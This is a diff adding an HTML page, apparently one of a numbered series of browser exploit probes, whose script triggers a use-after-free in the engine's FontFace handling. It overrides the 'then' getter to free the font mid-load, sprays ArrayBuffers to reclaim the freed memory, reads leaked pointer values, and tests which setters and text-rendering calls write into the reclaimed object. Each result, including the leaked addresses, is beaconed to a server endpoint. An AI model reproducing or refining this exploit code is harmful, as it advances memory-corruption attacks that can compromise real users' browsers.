@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P708v2 — CSSFontFace setter + render scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P708v2 — CSSFontFace Setter & Render Scout (Stable)
+ *
+ * P706 proved: all FontFace property GETTERS return cached JS-side
+ * values and zero writes hit the AB. This probe tests what DOES
+ * touch the C++ CSSFontFace: setters, re-add, text rendering.
+ *
+ * KEY FIX: Spray ZEROED ABs during the then getter. The engine
+ * continues accessing the freed CSSFontFace after then returns;
+ * NULL pointer checks protect against crashes (P706 survived).
+ * Pre-filling with a marker caused the engine to dereference
+ * the marker as a pointer, crashing (P708v1 failure).
+ *
+ * After detection, we fill controlled qwords with FILL_MARKER,
+ * THEN proceed to Phase C-F.
+ *
+ * CRASH_CLASS: MODERATE — setters may fault on pointer deref
+ * ============================================================ */
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P708-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,600))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function h16(v){ return ('0000000000000000'+BigInt(v).toString(16)).slice(-16); }
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+
+function snapAB(){
+  if(!VIEW_B) return [];
+  var s=[];
+  for(var q=0;q<24;q++) s.push(VIEW_B[q]);
+  return s;
+}
+function diffAB(pre){
+  if(!VIEW_B||!pre.length) return '';
+  var w=[];
+  for(var q=0;q<24;q++){
+    if(VIEW_B[q]!==pre[q]) w.push('q'+q+'=0x'+h16(VIEW_B[q]));
+  }
+  return w.length ? w.join(',') : 'none';
+}
+
+/* ---- Single-Pass FontFace UAF with ZEROED ABs ---- */
+function phaseA(cb){
+  b('A-GO','v2-zeroed');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:bb;src:local(Arial);unicode-range:U+42;}';
+  document.head.appendChild(st);
+  FACE_B=new FontFace('fb0','local(Helvetica)',{unicodeRange:'U+41'});
+  document.fonts.add(FACE_B); void FACE_B.loaded;
+
+  var abs=[], fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      /* ZEROED ABs — engine NULL-checks survive */
+      for(var k=0;k<48;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bb');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fb0, bb','AB');
+
+  setTimeout(function(){
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){
+      b('A-MISS','bestNz='+bestNz);
+      return;
+    }
+    BUF_B=abs[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+    P58=VIEW_B[11]; P68=VIEW_B[13];
+
+    var changed=[];
+    for(var q=0;q<24;q++){
+      if(VIEW_B[q]!==BigInt(0)) changed.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    }
+    b('A-HIT','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz+'|'+changed.join(','));
+
+    /* Now fill controlled qwords with FILL_MARKER for later detection */
+    var FILL=BigInt("0xDEAD0000DEAD0000");
+    for(var q=0;q<24;q++){
+      /* skip engine-written slots (q0, q11-q13) to not crash engine */
+      if(q===0||q===11||q===12||q===13) continue;
+      VIEW_B[q]=FILL;
+    }
+    b('A-FILLED','marker=0x'+h16(FILL));
+
+    delete FontFace.prototype.then;
+    setTimeout(function(){ cb(); }, 100);
+  }, 250);
+}
+
+/* ---- Phase C: Property SETTERS ---- */
+function phaseC(cb){
+  if(!FACE_B||!VIEW_B){ b('C-SKIP','no-face'); cb(); return; }
+  b('C-GO','');
+
+  var setters=[
+    ['family','TestFam'],
+    ['style','italic'],
+    ['weight','bold'],
+    ['stretch','condensed'],
+    ['unicodeRange','U+0-FF'],
+    ['featureSettings','"liga" 1'],
+    ['display','swap']
+  ];
+
+  var i=0;
+  function next(){
+    if(i>=setters.length){ cb(); return; }
+    var name=setters[i][0], val=setters[i][1];
+    i++;
+    b('C-PRE-'+name.toUpperCase(),'');
+    var pre=snapAB();
+    var err=null, result=null;
+    try{ FACE_B[name]=val; result='ok'; }catch(e){
+      err=(e.name||'')+'|'+(e.message||'').slice(0,80);
+    }
+    var d=diffAB(pre);
+    if(err) b('C-'+name.toUpperCase(), 'ERR='+err+'|writes='+d);
+    else b('C-'+name.toUpperCase(), 'val='+result+'|writes='+d);
+
+    try{
+      var rb=FACE_B[name];
+      b('C-'+name.toUpperCase()+'-RB', 'readback='+String(rb).slice(0,80));
+    }catch(e){
+      b('C-'+name.toUpperCase()+'-RB', 'ERR='+e.message);
+    }
+    setTimeout(next, 30);
+  }
+  next();
+}
+
+/* ---- Phase D: Re-add to document.fonts ---- */
+function phaseD(cb){
+  if(!FACE_B||!VIEW_B){ b('D-SKIP',''); cb(); return; }
+  b('D-PRE-ADD','');
+  var pre=snapAB();
+  try{
+    document.fonts.add(FACE_B);
+    b('D-ADD','ok|writes='+diffAB(pre));
+  }catch(e){
+    b('D-ADD','ERR='+(e.name||'')+'|'+(e.message||'').slice(0,100)+'|writes='+diffAB(pre));
+  }
+
+  try{
+    b('D-POST','size='+document.fonts.size+'|has='+document.fonts.has(FACE_B));
+  }catch(e){}
+
+  b('D-PRE-LOAD','');
+  pre=snapAB();
+  try{
+    var p=document.fonts.load('1em fb0','X');
+    b('D-LOAD','promise='+typeof p+'|writes='+diffAB(pre));
+  }catch(e){
+    b('D-LOAD','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  setTimeout(function(){ cb(); }, 100);
+}
+
+/* ---- Phase E: measureText + fillText ---- */
+function phaseE(cb){
+  if(!VIEW_B){ b('E-SKIP',''); cb(); return; }
+  b('E-GO','');
+  var cv=document.createElement('canvas'); cv.width=100; cv.height=50;
+  var cx=cv.getContext('2d');
+
+  b('E-PRE-MEASURE','');
+  var pre=snapAB();
+  try{
+    cx.font='24px fb0';
+    var m=cx.measureText('ABCD');
+    b('E-MEASURE','w='+m.width+'|writes='+diffAB(pre));
+  }catch(e){
+    b('E-MEASURE','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  b('E-PRE-FILL','');
+  pre=snapAB();
+  try{
+    cx.fillStyle='red';
+    cx.fillText('ABCD',10,30);
+    b('E-FILL','ok|writes='+diffAB(pre));
+  }catch(e){
+    b('E-FILL','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  b('E-PRE-STROKE','');
+  pre=snapAB();
+  try{
+    cx.strokeText('EFGH',10,30);
+    b('E-STROKE','ok|writes='+diffAB(pre));
+  }catch(e){
+    b('E-STROKE','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  try{
+    var px=cx.getImageData(0,0,100,50).data;
+    var nzp=0;
+    for(var j=0;j<px.length;j+=4) if(px[j]>0||px[j+1]>0||px[j+2]>0) nzp++;
+    b('E-PIXELS','nonzero='+nzp);
+  }catch(e){}
+
+  setTimeout(function(){ cb(); }, 60);
+}
+
+/* ---- Phase F: DOM layout with corrupted font ---- */
+function phaseF(){
+  if(!VIEW_B){ b('F-SKIP',''); b('DONE','p708v2-done'); return; }
+  b('F-GO','');
+
+  var div=document.createElement('div');
+  div.style.fontFamily='fb0, serif';
+  div.style.fontSize='20px';
+  div.textContent='Test text XYZ';
+  document.body.appendChild(div);
+
+  b('F-PRE-LAYOUT','');
+  var pre=snapAB();
+  try{
+    var r=div.getBoundingClientRect();
+    b('F-LAYOUT','w='+r.width+'|h='+r.height+'|writes='+diffAB(pre));
+  }catch(e){
+    b('F-LAYOUT','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  b('F-PRE-COMPUTED','');
+  pre=snapAB();
+  try{
+    var cs=window.getComputedStyle(div);
+    b('F-COMPUTED','font='+cs.fontFamily+'|writes='+diffAB(pre));
+  }catch(e){
+    b('F-COMPUTED','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  pre=snapAB();
+  try{
+    var ow=div.offsetWidth, oh=div.offsetHeight;
+    b('F-REFLOW','ow='+ow+'|oh='+oh+'|writes='+diffAB(pre));
+  }catch(e){
+    b('F-REFLOW','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* final full AB dump */
+  var FILL=BigInt("0xDEAD0000DEAD0000");
+  var parts=[];
+  for(var q=0;q<24;q++){
+    var v=VIEW_B[q];
+    if(v!==FILL && v!==BigInt(0)) parts.push('q'+q+'=0x'+h16(v));
+  }
+  b('FINAL','nParts='+parts.length+'|'+parts.join(','));
+
+  b('DONE','p708v2-complete');
+}
+
+/* ---- Main ---- */
+function run(){
+  b('BOOT','p708v2');
+  phaseA(function(){
+    phaseC(function(){
+      phaseD(function(){
+        phaseE(function(){
+          phaseF();
+        });
+      });
+    });
+  });
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P708v2 — CSSFontFace setter + render scout</pre></body></html>
